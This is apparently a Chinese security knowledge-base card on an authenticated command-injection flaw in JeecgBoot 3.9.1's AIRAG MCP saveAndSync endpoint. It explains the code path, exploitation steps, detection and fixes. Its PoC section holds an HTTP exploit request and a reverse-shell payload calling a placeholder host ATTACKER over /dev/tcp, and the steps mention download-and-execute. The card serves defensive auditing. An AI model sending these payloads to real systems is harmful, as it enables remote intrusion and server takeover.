---
id: ai-security-mcp-stdio-endpoint-command-injection
title: MCP 客户端 stdio endpoint 直拼 sh -c：AIRAG saveAndSync 认证用户命令执行
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-stdio-endpoint-command-injection
aliases:
- MCP stdio 命令注入
- AIRAG saveAndSync RCE
- JeecgBoot MCP 命令执行
- endpoint 直拼 sh -c
- MCP 客户端配置命令执行
tags:
- mcp
- stdio
- command-injection
- rce
- java
- jeecg
- airag
- processbuilder
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:26:52+08:00'
  notes: 已对照原文与图01-03核对：AiragMcpController.saveAndSync 为 @PostMapping('/saveAndSync')，先 edit(@RequestBody AiragMcp) 再 sync(id)；AiragMcp 的 type/endpoint 注释与截图一致；sync 的 stdio 分支先检查 allowSensitiveNodes 字符串包含 stdio（忽略大小写），再按 os.name 拼 cmd.exe /c 或 sh -c + endpoint.trim()，交给 StdioMcpTransport.Builder().command(cmdParts)。原文为审计记录、无 exp/回显，卡内 PoC 为按代码构造、未执行。未设置 affected_versions：3.9.1 仅为审计/目标版本，原文未给影响区间。图片代码注释称'默认禁用 stdio'，原文配置示例称开发/演示默认 sql,stdio，卡内按原文标注了配置前提。frontmatter 无 sources/source_url。
---

## 一句话结论

JeecgBoot 3.9.1 新增的 AIRAG MCP 模块把数据库/请求体里的 `endpoint` 当作 stdio 类型的启动命令：`AiragMcpController.saveAndSync` 先持久化 `@RequestBody AiragMcp`，再调用 `sync(id)`，后者在 stdio 分支直接把 `endpoint.trim()` 拼进 `["sh","-c",...]`（Windows 为 `cmd.exe /c`）交给 `StdioMcpTransport` 启动子进程；只要 `allow-sensitive-nodes` 配置包含 `stdio`（开发/演示默认 `sql,stdio`），任何已认证用户都能通过该接口执行任意命令。

## 原理

- 入口：`POST /jeecg-boot/airag/airagMcp/saveAndSync`，参数为 `@RequestBody AiragMcp`，方法体依次执行 `airagMcpService.edit(airagMcp)` 与 `airagMcpService.sync(id)`；`id` 取自请求体，为空则返回“保存失败”。
- 实体 `AiragMcp` 中 `type` 注释为“sse：sse类型；stdio：标准类型”，`endpoint` 注释为“SSE类型为URL，stdio类型为命令”；两者都来自 `@RequestBody`，完全由调用方控制，`edit` 环节没有任何校验。
- `AiragMcpServiceImpl.sync` 的 stdio 分支先检查 `aiRagConfigBean.getAllowSensitiveNodes()` 是否包含字符串 `stdio`（忽略大小写）。通过后按操作系统拼命令：Windows 用 `cmd.exe /c <endpoint.trim()>`，其他系统用 `sh -c <endpoint.trim()>`，再传给 `StdioMcpTransport.Builder().command(cmdParts)` → `DefaultMcpClient`，由 MCP SDK 启动子进程。
- 根因是“MCP stdio 的语义本来就是启动本地命令”，但实现把用户可控的配置字段直接作为 shell 命令行，而不是固定可执行文件 + 参数数组；`sh -c` 还会解释 `;`、`|`、`$()`、重定向等 shell 元字符，因此 `endpoint` 可以是任意命令串。
- 唯一的门槛是敏感节点开关：配置文件默认 `allow-sensitive-nodes: sql,stdio`（注释为开发/演示环境），代码里只有字符串包含判断，没有按环境/角色收紧。
- 影响：已认证用户获得应用进程权限的命令执行；不需要出网、不依赖 gadget，属于 MCP 客户端配置面的直接命令注入。

## 触发条件

- 目标为包含 AIRAG MCP 模块的 JeecgBoot 3.9.1（文章审计版本；该模块为 3.9.1 新增）。
- 攻击者拥有可访问 `/jeecg-boot/airag/airagMcp/saveAndSync` 的已认证账号（无需管理员，文章表述为“认证用户即可 RCE”）。
- 配置 `jeecg.ai-rag.allow-sensitive-nodes` 包含 `stdio`（开发/演示默认 `sql,stdio`；若被改为不含 `stdio` 则不进入该分支）。
- 应用进程有权限执行目标命令；Linux/macOS 走 `sh -c`，Windows 走 `cmd.exe /c`。

## 利用步骤

1. 登录获取有效会话/Token，确认可访问 AIRAG 接口。
2. 确认 `allow-sensitive-nodes` 包含 `stdio`（可通过配置泄露、默认值或响应差异判断；无权限时先按默认值尝试）。
3. 构造并发送 `saveAndSync` 请求：`type` 设为 `stdio`，`endpoint` 设为要执行的命令，`id` 填一个可保存的标识（编辑成功后会用它同步）。
4. `edit` 持久化后 `sync(id)` 读取记录，进入 stdio 分支拼出 `sh -c <endpoint>` 并启动 `StdioMcpTransport`；命令在应用进程中执行。
5. 用文件落地、回连或 DNS 验证执行；若命令需要保持长连接，可写反弹 shell 或下载执行。
6. 清理/覆盖 `endpoint` 或删除该 MCP 记录，避免下次重启/同步再次触发。

## PoC

```http
POST /jeecg-boot/airag/airagMcp/saveAndSync HTTP/1.1
Host: target
Content-Type: application/json
Cookie: <已认证会话>

{"id":"1","type":"stdio","endpoint":"id > /tmp/mcp_pwned"}
```

```text
服务端等价执行：
  Linux/macOS: /bin/sh -c "id > /tmp/mcp_pwned"
  Windows:     cmd.exe /c "id > /tmp/mcp_pwned"
预期：/tmp/mcp_pwned 出现命令输出；响应可能只反映 MCP 客户端启动结果，命令执行不依赖响应。
```

```json
// 反弹 shell 形态（Linux，需目标可出网）
{"id":"1","type":"stdio","endpoint":"sh -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"}
```

```text
文章为代码审计记录，未提供完整 exp/回显；上述 PoC 为本卡按代码路径最小化构造，未在本机执行。
```

## 变体与关联

- 变体（Windows）：同一分支用 `cmd.exe /c`，可用 `&`、`|`、`>` 等 cmd 元字符；命令语法需按 Windows 调整。
- 变体（SSE）：`type=sse` 时 `endpoint` 被当作 URL 连接，可能引入 SSRF/任意 MCP 服务端连接面，但不在本卡范围。
- 变体（其他 MCP 客户端）：凡是把用户可编辑的 `command/args/env`（或等价的 endpoint 字段）持久化后交给 `StdioClientTransport`/`ProcessBuilder` 的实现，都适用同一审计思路，例如管理后台的 MCP 工具配置、Agent 平台的插件配置。
- 关联：[[ai-security-mcp-security-inspector-cors-stdio-rce]] 是 MCP Inspector 未授权跨站触发 stdio 的案例；本卡是业务系统内已认证用户通过 MCP 配置接口注入命令，信任边界不同。
- 关联：同层 MCP 工具鉴权/权限卡；本卡聚焦 stdio 传输的进程启动面。
- 边界：`allow-sensitive-nodes` 不含 `stdio` 时分支不执行；无认证入口或接口被网关阻断时不可达；命令以应用进程权限运行，受容器/低权限账户限制。

## 检测与防御

- 请求检测：`/airag/airagMcp/saveAndSync` 请求体中 `type=stdio` 且 `endpoint` 含 `;`、`|`、`&`、`$(`、反引号、`>`、`/dev/tcp`、`bash -i`、`cmd.exe` 等 shell 特征；同一账号短时间反复保存/同步 MCP 配置。
- 主机检测：应用进程（Java）派生出 `sh -c`/`cmd.exe /c` 子进程，子进程命令行包含业务字段值；日志出现 `[MCP]执行stdio命令` 与异常 endpoint；临时目录/启动目录出现落地文件。
- 修复：`allow-sensitive-nodes` 默认不含 `stdio`，生产环境禁止开启；`saveAndSync` 仅限管理员并做二次鉴权。
- 修复：不要用 `sh -c` 拼接 endpoint；stdio 启动改为固定可执行文件 + 参数数组，或对 endpoint 做严格白名单（只允许预注册的 MCP server 命令）。
- 加固：对 MCP 配置做完整性校验与审计日志（谁在何时改了 command/args/env）；容器内低权限运行、限制子进程与出网；WAF 拦截含 shell 元字符的 endpoint。
- 审计：搜索 `StdioMcpTransport`、`ProcessBuilder`、`Runtime.exec`、`sh -c`、`cmd.exe /c` 的调用点，沿字段来源回溯到 `@RequestBody`/数据库/配置；检查敏感节点开关的默认值与作用域。
